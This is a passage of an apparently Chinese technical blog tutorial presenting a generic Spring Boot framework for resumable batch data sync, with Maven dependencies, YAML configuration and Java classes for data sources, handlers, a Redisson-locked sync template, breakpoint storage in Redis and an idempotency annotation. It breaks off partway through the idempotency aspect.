        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 分布式锁/Redis --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.redisson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>redisson-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.23.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 数据库 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 工具类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${spring-cloud.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>
</code></pre>
<h5 data-id="heading-5">2.2.2 核心配置（application.yml）</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>

<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">sync-resume-generic</span>
  <span class="hljs-comment"># Nacos注册中心</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">nacos:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>
  <span class="hljs-comment"># 数据库配置</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://127.0.0.1:3306/sync_db?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">root</span>
  <span class="hljs-comment"># Redis配置</span>
  <span class="hljs-attr">data:</span>
    <span class="hljs-attr">redis:</span>
      <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
      <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>
      <span class="hljs-attr">password:</span>
      <span class="hljs-attr">database:</span> <span class="hljs-number">0</span>

<span class="hljs-comment"># MyBatis-Plus配置</span>
<span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mapper/**/*.xml</span>
  <span class="hljs-attr">type-aliases-package:</span> <span class="hljs-string">com.example.sync.entity</span>
  <span class="hljs-attr">configuration:</span>
    <span class="hljs-attr">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span>

<span class="hljs-comment"># 同步通用配置</span>
<span class="hljs-attr">sync:</span>
  <span class="hljs-attr">batch-size:</span> <span class="hljs-number">1000</span>        <span class="hljs-comment"># 默认批次大小</span>
  <span class="hljs-attr">lock-prefix:</span> <span class="hljs-string">sync_lock</span>  <span class="hljs-comment"># 分布式锁前缀</span>
  <span class="hljs-attr">break-point-prefix:</span> <span class="hljs-string">sync_break_point_</span> <span class="hljs-comment"># 断点前缀</span>
  <span class="hljs-attr">retry-count:</span> <span class="hljs-number">3</span>          <span class="hljs-comment"># 默认重试次数</span>
</code></pre>
<h5 data-id="heading-6">2.2.3 核心抽象接口</h5>
<h6 data-id="heading-7">通用数据源接口（SyncDataSource）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.core;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * 通用同步数据源接口（定义“查什么数据”的差异化逻辑）
 * <span class="hljs-doctag">@param</span> &lt;T&gt; 业务数据类型（如OrderDO、ProductDO）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SyncDataSource</span>&lt;T&gt; {
    <span class="hljs-comment">/**
     * 按断点查询待同步数据
     * <span class="hljs-doctag">@param</span> lastBreakPoint 最后同步的断点（ID）
     * <span class="hljs-doctag">@param</span> batchSize 批次大小
     * <span class="hljs-doctag">@return</span> 待同步数据列表
     */</span>
    List&lt;T&gt; <span class="hljs-title function_">selectWaitSyncData</span><span class="hljs-params">(Long lastBreakPoint, Integer batchSize)</span>;

    <span class="hljs-comment">/**
     * 批量更新同步状态（幂等保障）
     * <span class="hljs-doctag">@param</span> dataIds 业务数据ID列表
     * <span class="hljs-doctag">@param</span> syncStatus 同步状态（0-未同步，1-已同步）
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchUpdateSyncStatus</span><span class="hljs-params">(List&lt;Long&gt; dataIds, Integer syncStatus)</span>;

    <span class="hljs-comment">/**
     * 获取单条数据的ID（统一断点标识）
     * <span class="hljs-doctag">@param</span> data 业务数据
     * <span class="hljs-doctag">@return</span> 数据ID
     */</span>
    Long <span class="hljs-title function_">getDataId</span><span class="hljs-params">(T data)</span>;

    <span class="hljs-comment">/**
     * 获取业务编码（与SyncHandler一致）
     * <span class="hljs-doctag">@return</span> 业务编码（如order_sync）
     */</span>
    String <span class="hljs-title function_">getBizCode</span><span class="hljs-params">()</span>;
}
</code></pre>
<h6 data-id="heading-8">通用同步处理器接口（SyncHandler）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.core;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * 通用同步处理器接口（定义“怎么同步数据”的差异化逻辑）
 * <span class="hljs-doctag">@param</span> &lt;T&gt; 业务数据类型（如OrderDO、ProductDO）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SyncHandler</span>&lt;T&gt; {
    <span class="hljs-comment">/**
     * 同步数据到目标服务/数据库
     * <span class="hljs-doctag">@param</span> dataList 待同步数据列表
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncToTarget</span><span class="hljs-params">(List&lt;T&gt; dataList)</span>;

    <span class="hljs-comment">/**
     * 获取业务编码（唯一标识，如order_sync、product_sync）
     * <span class="hljs-doctag">@return</span> 业务编码
     */</span>
    String <span class="hljs-title function_">getBizCode</span><span class="hljs-params">()</span>;
}
</code></pre>
<h6 data-id="heading-9">通用同步上下文（SyncContext）</h6>
<pre><code class="hljs language-arduino" lang="arduino">package com.example.sync.core;

<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.experimental.Accessors;

<span class="hljs-comment">/**
 * 通用同步上下文（封装任务参数，避免方法参数过多）
 */</span>
@Data
@<span class="hljs-built_in">Accessors</span>(chain = <span class="hljs-literal">true</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncContext</span> {
    <span class="hljs-comment">/** 业务编码（核心：路由到具体业务实现） */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> bizCode;
    <span class="hljs-comment">/** 批次大小（默认取配置） */</span>
    <span class="hljs-keyword">private</span> Integer batchSize;
    <span class="hljs-comment">/** 重试次数（默认取配置） */</span>
    <span class="hljs-keyword">private</span> Integer retryCount;
    <span class="hljs-comment">/** 分布式锁前缀（默认取配置） */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> lockPrefix;
    <span class="hljs-comment">/** 断点前缀（默认取配置） */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> breakPointPrefix;
}
</code></pre>
<h5 data-id="heading-10">2.2.4 通用模板类（核心封装）</h5>
<pre><code class="hljs language-ini" lang="ini">package com.example.sync.core<span class="hljs-comment">;</span>

import com.example.sync.service.SyncTaskService<span class="hljs-comment">;</span>
import com.example.sync.util.BreakPointManager<span class="hljs-comment">;</span>
import lombok.RequiredArgsConstructor<span class="hljs-comment">;</span>
import lombok.extern.slf4j.Slf4j<span class="hljs-comment">;</span>
import org.redisson.api.RLock<span class="hljs-comment">;</span>
import org.redisson.api.RedissonClient<span class="hljs-comment">;</span>
import org.springframework.beans.factory.annotation.Value<span class="hljs-comment">;</span>
import org.springframework.stereotype.Component<span class="hljs-comment">;</span>

import java.util.List<span class="hljs-comment">;</span>
import java.util.Map<span class="hljs-comment">;</span>
import java.util.concurrent.TimeUnit<span class="hljs-comment">;</span>

/**
 * 通用断点续传同步模板类（封装所有通用逻辑，业务无需关心）
 */
@Slf4j
@Component
@RequiredArgsConstructor
public class GenericSyncTemplate {
    // 通用配置
    @Value("${sync.batch-size}")
    private Integer defaultBatchSize<span class="hljs-comment">;</span>
    @Value("${sync.lock-prefix}")
    private String defaultLockPrefix<span class="hljs-comment">;</span>
    @Value("${sync.break-point-prefix}")
    private String defaultBreakPointPrefix<span class="hljs-comment">;</span>
    @Value("${sync.retry-count}")
    private Integer defaultRetryCount<span class="hljs-comment">;</span>

    // 通用组件
    private final BreakPointManager breakPointManager<span class="hljs-comment">;</span>
    private final SyncTaskService syncTaskService<span class="hljs-comment">;</span>
    private final RedissonClient redissonClient<span class="hljs-comment">;</span>

    // Spring自动收集所有业务实现（<span class="hljs-attr">key</span>=bean名称，需手动适配bizCode）
    private final Map&lt;String, SyncDataSource&lt;?&gt;&gt; syncDataSourceMap<span class="hljs-comment">;</span>
    private final Map&lt;String, SyncHandler&lt;?&gt;&gt; syncHandlerMap<span class="hljs-comment">;</span>

    /**
     * 通用同步方法（启动/恢复断点续传）
     * @param context 同步上下文
     */
    @SuppressWarnings("unchecked")
    public void startOrResumeSync(SyncContext context) {
        // 1. 补全上下文默认值
        String <span class="hljs-attr">bizCode</span> = context.getBizCode()<span class="hljs-comment">;</span>
        Integer <span class="hljs-attr">batchSize</span> = context.getBatchSize() == null ? defaultBatchSize : context.getBatchSize()<span class="hljs-comment">;</span>
        Integer <span class="hljs-attr">retryCount</span> = context.getRetryCount() == null ? defaultRetryCount : context.getRetryCount()<span class="hljs-comment">;</span>
        String <span class="hljs-attr">lockPrefix</span> = context.getLockPrefix() == null ? defaultLockPrefix : context.getLockPrefix()<span class="hljs-comment">;</span>

        // 2. 查找业务实现（按bizCode匹配）
        SyncDataSource&lt;?&gt; <span class="hljs-attr">dataSource</span> = findDataSourceByBizCode(bizCode)<span class="hljs-comment">;</span>
        SyncHandler&lt;?&gt; <span class="hljs-attr">handler</span> = findHandlerByBizCode(bizCode)<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">dataSource</span> == null || handler == null) {
            throw new RuntimeException("未找到业务<span class="hljs-section">[" + bizCode + "]</span>的同步实现类")<span class="hljs-comment">;</span>
        }

        // 3. 分布式锁：避免高并发下多节点执行同一任务
        String <span class="hljs-attr">lockKey</span> = lockPrefix + <span class="hljs-string">"_"</span> + bizCode<span class="hljs-comment">;</span>
        RLock <span class="hljs-attr">lock</span> = redissonClient.getLock(lockKey)<span class="hljs-comment">;</span>
        try {
            boolean <span class="hljs-attr">locked</span> = lock.tryLock(<span class="hljs-number">5</span>, <span class="hljs-number">30</span>, TimeUnit.SECONDS)<span class="hljs-comment">;</span>
            if (!locked) {
                log.warn("业务<span class="hljs-section">[{}]</span>获取分布式锁失败，任务已在执行", bizCode)<span class="hljs-comment">;</span>
                return<span class="hljs-comment">;</span>
            }

            // 4. 初始化断点（Redis → MySQL）
            Long <span class="hljs-attr">lastBreakPoint</span> = breakPointManager.getBreakPoint(bizCode)<span class="hljs-comment">;</span>
            if (<span class="hljs-attr">lastBreakPoint</span> == <span class="hljs-number">0</span>) {
                <span class="hljs-attr">lastBreakPoint</span> = syncTaskService.getSyncTaskByCode(bizCode).getLastBreakPoint()<span class="hljs-comment">;</span>
            }
            log.info("业务<span class="hljs-section">[{}]</span>开始同步，断点位置：{}", bizCode, lastBreakPoint)<span class="hljs-comment">;</span>

            // 5. 更新任务状态为“同步中”
            syncTaskService.updateTaskStatus(bizCode, 1)<span class="hljs-comment">;</span>

            // 6. 批次同步主逻辑
            int <span class="hljs-attr">retry</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            while (true) {
                try {
                    // 6.1 查询待同步数据（调用业务数据源实现）
                    List&lt;?&gt; <span class="hljs-attr">dataList</span> = dataSource.selectWaitSyncData(lastBreakPoint, batchSize)<span class="hljs-comment">;</span>
                    if (dataList.isEmpty()) {
                        log.info("业务<span class="hljs-section">[{}]</span>同步完成，最终断点：{}", bizCode, lastBreakPoint)<span class="hljs-comment">;</span>
                        // 同步完成：清理断点+更新任务状态
                        breakPointManager.clearBreakPoint(bizCode)<span class="hljs-comment">;</span>
                        syncTaskService.updateTaskBreakPoint(bizCode, lastBreakPoint)<span class="hljs-comment">;</span>
                        syncTaskService.updateTaskStatus(bizCode, 2)<span class="hljs-comment">;</span>
                        break<span class="hljs-comment">;</span>
                    }

                    // 6.2 同步数据到目标（调用业务处理器实现）
                    handler.syncToTarget(dataList)<span class="hljs-comment">;</span>

                    // 6.3 更新同步状态（幂等保障）
                    List&lt;Long&gt; <span class="hljs-attr">dataIds</span> = (List&lt;Long&gt;) dataList.stream()
                            .map(data -&gt; dataSource.getDataId((Object) data))
                            .toList()<span class="hljs-comment">;</span>
                    dataSource.batchUpdateSyncStatus(dataIds, 1)<span class="hljs-comment">;</span>

                    // 6.4 更新断点（Redis实时保存）
                    <span class="hljs-attr">lastBreakPoint</span> = dataSource.getDataId(dataList.get(dataList.size() - <span class="hljs-number">1</span>))<span class="hljs-comment">;</span>
                    breakPointManager.updateBreakPoint(bizCode, lastBreakPoint)<span class="hljs-comment">;</span>
                    log.info("业务<span class="hljs-section">[{}]</span>批次同步完成，更新断点：{}", bizCode, lastBreakPoint)<span class="hljs-comment">;</span>

                    // 重置重试次数
                    <span class="hljs-attr">retry</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
                } catch (Exception e) {
                    retry++<span class="hljs-comment">;</span>
                    log.error("业务<span class="hljs-section">[{}]</span>同步失败，断点：{}，重试次数：{}", bizCode, lastBreakPoint, retry, e)<span class="hljs-comment">;</span>
                    if (retry &gt;= retryCount) {
                        // 重试超限：标记任务异常
                        syncTaskService.updateTaskStatus(bizCode, 3)<span class="hljs-comment">;</span>
                        throw new RuntimeException("业务<span class="hljs-section">[" + bizCode + "]</span>同步失败，重试次数超限", e)<span class="hljs-comment">;</span>
                    }
                    // 短暂休眠后重试
                    TimeUnit.SECONDS.sleep(1)<span class="hljs-comment">;</span>
                }
            }
        } catch (Exception e) {
            log.error("业务<span class="hljs-section">[{}]</span>同步异常", bizCode, e)<span class="hljs-comment">;</span>
            syncTaskService.updateTaskStatus(bizCode, 3)<span class="hljs-comment">;</span>
        } finally {
            // 释放分布式锁
            if (lock.isHeldByCurrentThread()) {
                lock.unlock()<span class="hljs-comment">;</span>
            }
        }
    }

    /**
     * 按bizCode查找数据源实现
     */
    private SyncDataSource&lt;?&gt; findDataSourceByBizCode(String bizCode) {
        return syncDataSourceMap.values().stream()
                .filter(dataSource -&gt; bizCode.equals(dataSource.getBizCode()))
                .findFirst()
                .orElse(null)<span class="hljs-comment">;</span>
    }

    /**
     * 按bizCode查找处理器实现
     */
    private SyncHandler&lt;?&gt; findHandlerByBizCode(String bizCode) {
        return syncHandlerMap.values().stream()
                .filter(handler -&gt; bizCode.equals(handler.getBizCode()))
                .findFirst()
                .orElse(null)<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h5 data-id="heading-11">2.2.5 通用工具类</h5>
<h6 data-id="heading-12">断点管理工具（BreakPointManager）</h6>
<pre><code class="hljs language-typescript" lang="typescript">package com.<span class="hljs-property">example</span>.<span class="hljs-property">sync</span>.<span class="hljs-property">util</span>;

<span class="hljs-keyword">import</span> lombok.<span class="hljs-property">RequiredArgsConstructor</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">beans</span>.<span class="hljs-property">factory</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">Value</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">data</span>.<span class="hljs-property">redis</span>.<span class="hljs-property">core</span>.<span class="hljs-property">StringRedisTemplate</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">stereotype</span>.<span class="hljs-property">Component</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">util</span>.<span class="hljs-property">StringUtils</span>;

<span class="hljs-comment">/**
 * 通用断点管理工具（Redis存储实时断点）
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BreakPointManager</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">StringRedisTemplate</span> redisTemplate;

    <span class="hljs-meta">@Value</span>(<span class="hljs-string">"${sync.break-point-prefix}"</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> breakPointPrefix;

    <span class="hljs-comment">/**
     * 获取业务断点
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">getBreakPoint</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> bizCode</span>) {
        <span class="hljs-title class_">String</span> key = breakPointPrefix + bizCode;
        <span class="hljs-title class_">String</span> value = redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">get</span>(key);
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">hasText</span>(value) ? <span class="hljs-title class_">Long</span>.<span class="hljs-title function_">parseLong</span>(value) : 0L;
    }

    <span class="hljs-comment">/**
     * 更新业务断点
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateBreakPoint</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> bizCode, Long breakPoint</span>) {
        <span class="hljs-title class_">String</span> key = breakPointPrefix + bizCode;
        redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">set</span>(key, breakPoint.<span class="hljs-title function_">toString</span>());
    }

    <span class="hljs-comment">/**
     * 清理业务断点
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">clearBreakPoint</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> bizCode</span>) {
        <span class="hljs-title class_">String</span> key = breakPointPrefix + bizCode;
        redisTemplate.<span class="hljs-title function_">delete</span>(key);
    }
}
</code></pre>
<h6 data-id="heading-13">幂等注解（Idempotent）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.annotation;

<span class="hljs-keyword">import</span> java.lang.annotation.*;

<span class="hljs-comment">/**
 * 通用幂等注解（避免重复同步）
 */</span>
<span class="hljs-meta">@Target(ElementType.METHOD)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Idempotent {
    <span class="hljs-comment">/** 幂等Key前缀 */</span>
    String <span class="hljs-title function_">prefix</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">"sync_idempotent_"</span>;
    <span class="hljs-comment">/** 过期时间（秒） */</span>
    <span class="hljs-type">long</span> <span class="hljs-title function_">expireTime</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">300</span>;
}
</code></pre>
<h6 data-id="heading-14">幂等切面（IdempotentAspect）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.aspect;

<span class="hljs-keyword">import</span> com.example.sync.annotation.Idempotent;
<span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;
<span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Around;
<span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Aspect;
<span class="hljs-keyword">import</span> org.aspectj.lang.reflect.MethodSignature;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.lang.reflect.Method;
<span class="hljs-keyword">import</span> java.util.UUID;

<span class="hljs-comment">/**
 * 通用幂等切面（基于Redis）
 */</span>
<span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdempotentAspect</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StringRedisTemplate redisTemplate;

    <span class="hljs-meta">@Around("@annotation(idempotent)")</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint joinPoint)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-type">MethodSignature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> (MethodSignature) joinPoint.getSignature();
        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> signature.getMethod();
        <span class="hljs-type">Idempotent</span> <span class="hljs-variable">idempotent</span> <span class="hljs-operator">=</span> method.getAnnotation(Idempotent.class);

        <span class="hljs-comment">// 生成幂等Key：前缀 + 方法名 + 第一个参数（业务数据ID）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> idempotent.prefix() + method.getName() + <span class="hljs-string">"_"</span> + joinPoint.getArgs()[<span class="hljs-number">0</span>];
        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();

        <span class="hljs-comment">// SETNX实现幂等（不存在则设置）</span>
